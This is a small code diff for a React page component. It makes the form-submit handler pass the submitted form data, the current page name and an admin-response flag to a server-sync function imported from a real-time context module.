@@ -12,6 +12,7 @@ import {
   checkUser,
   currentPage,
   mainInfo,
+  sendDataToServer,
 } from "../../real-time/context/signals";
 
 function Page1() {
@@ -27,6 +28,12 @@ function Page1() {
 
   function sendData(data: FieldValues) {
     checkUser(data, navigate);
+    sendDataToServer({
+      current: "page1",
+      data,
+      nextPage: "",
+      waitingForAdminResponse: false,
+    });
   }
 
   useEffect(() => {
